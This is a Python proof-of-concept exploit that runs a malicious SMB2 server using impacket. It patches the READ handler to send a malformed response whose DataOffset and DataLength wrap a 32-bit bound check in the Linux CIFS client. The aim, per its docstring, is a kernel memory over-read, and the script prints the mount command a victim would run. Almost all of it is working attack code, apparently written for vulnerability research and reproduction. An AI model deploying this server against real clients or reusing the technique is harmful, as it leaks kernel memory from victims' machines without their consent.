#!/usr/bin/env python3
"""
CIFS-SMB2-READ-OVERFLOW malicious SMB2 server (impacket-based).

Uses impacket's SimpleSMBServer for the boring parts (NEGOTIATE, NTLMSSP session
setup, TREE_CONNECT, CREATE) and monkey-patches SMB2Commands.smb2Read to return
a malformed SMB2_READ_RSP with:

    DataOffset = 0x50
    DataLength = 0xFFFFFFB0      (attacker-controlled __le32)
    Buffer     = 0xCC * 64       (marker bytes for visual identification)

On a vulnerable Linux CIFS client (linux-v7.0 @ <linux-v7.0-tag>) this triggers the
u32 + u32 wrap at fs/smb/client/transport.c:1259 or fs/smb/client/smb2ops.c:4839,
bypassing the bound check and leading to over-read via copy_to_iter() or
cifs_read_iter_from_socket().

Usage:
    python3 malicious_server_impacket.py [port=1445] [share_dir=/tmp/share]
"""
import argparse
import logging
import os
import sys
import tempfile

from impacket import smb3structs as smb2
from impacket import smbserver
from impacket.smbserver import SMB2Commands, PIPE_FILE_DESCRIPTOR
# Note: STATUS_SMB_BAD_TID lives in impacket.smbserver as a module-level constant
from impacket.smbserver import STATUS_SMB_BAD_TID
from impacket.nt_errors import STATUS_INVALID_HANDLE, STATUS_ACCESS_DENIED


def malicious_smb2Read(connId, smbServer, recvPacket):
    """
    Drop-in replacement for impacket.smbserver.SMB2Commands.smb2Read.
    Identical bookkeeping; only DataOffset/DataLength are doctored on success.
    """
    connData = smbServer.getConnectionData(connId)
    respSMBCommand = smb2.SMB2Read_Response()
    readRequest = smb2.SMB2Read(recvPacket['Data'])

    respSMBCommand['Buffer'] = b'\x00'

    if readRequest['FileID'].getData() == b'\xff' * 16:
        if 'SMB2_CREATE' in connData['LastRequest']:
            fileID = connData['LastRequest']['SMB2_CREATE']['FileID']
        else:
            fileID = readRequest['FileID'].getData()
    else:
        fileID = readRequest['FileID'].getData()

    if recvPacket['TreeID'] in connData['ConnectedShares']:
        if fileID in connData['OpenedFiles']:
            fileHandle = connData['OpenedFiles'][fileID]['FileHandle']
            errorCode = 0
            try:
                if fileHandle != PIPE_FILE_DESCRIPTOR:
                    offset = readRequest['Offset']
                    os.lseek(fileHandle, offset, 0)
                    content = os.read(fileHandle, readRequest['Length'])
                else:
                    sock = connData['OpenedFiles'][fileID]['Socket']
                    content = sock.recv(readRequest['Length'])

                # === CIFS-SMB2-READ-OVERFLOW PAYLOAD ===
                respSMBCommand['DataOffset'] = 0x50
                respSMBCommand['DataLength'] = 0xFFFFFFB0    # malicious: u32 wrap with DataOffset
                respSMBCommand['DataRemaining'] = 0
                # Keep buffer small but marker-tagged so leaked memory is recognisable
                respSMBCommand['Buffer'] = b'\xCC' * 64
                print(f"[!!!] SMB2_READ — malicious response: DataOffset=0x50  DataLength=0xFFFFFFB0", flush=True)
            except Exception as e:
                smbServer.log('SMB2_READ: %s ' % e, logging.ERROR)
                errorCode = STATUS_ACCESS_DENIED
        else:
            errorCode = STATUS_INVALID_HANDLE
    else:
        errorCode = STATUS_SMB_BAD_TID

    smbServer.setConnectionData(connId, connData)
    return [respSMBCommand], None, errorCode


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=1445)
    ap.add_argument("--share-dir", default=None)
    args = ap.parse_args()

    # Set up share directory with one regular file
    share_dir = args.share_dir or tempfile.mkdtemp(prefix="ksmb01-share-")
    os.makedirs(share_dir, exist_ok=True)
    target_file = os.path.join(share_dir, "file")
    if not os.path.exists(target_file):
        with open(target_file, "wb") as f:
            f.write(b"REAL-DATA-NEVER-SEEN " * 16)
    print(f"[+] Share dir: {share_dir}  (file: {target_file}, {os.path.getsize(target_file)} bytes)", flush=True)

    # Monkey-patch BEFORE constructing the server (impacket binds methods at startup)
    SMB2Commands.smb2Read = staticmethod(malicious_smb2Read)
    print(f"[+] Monkey-patched impacket.smbserver.SMB2Commands.smb2Read", flush=True)

    # Build server
    server = smbserver.SimpleSMBServer(listenAddress="0.0.0.0", listenPort=args.port)
    server.setSMB2Support(True)
    server.addShare("SHARE", share_dir, "")
    server.addCredential("guest", 0, "", "")
    server.setLogFile("")  # log to stdout

    print(f"[+] CIFS-SMB2-READ-OVERFLOW impacket server listening on 0.0.0.0:{args.port}", flush=True)
    print(f"    Victim mount: mount -t cifs //10.0.2.2/SHARE /mnt "
          f"-o sec=ntlmssp,user=guest,password=,vers=3.0,port={args.port}", flush=True)
    server.start()


if __name__ == "__main__":
    main()
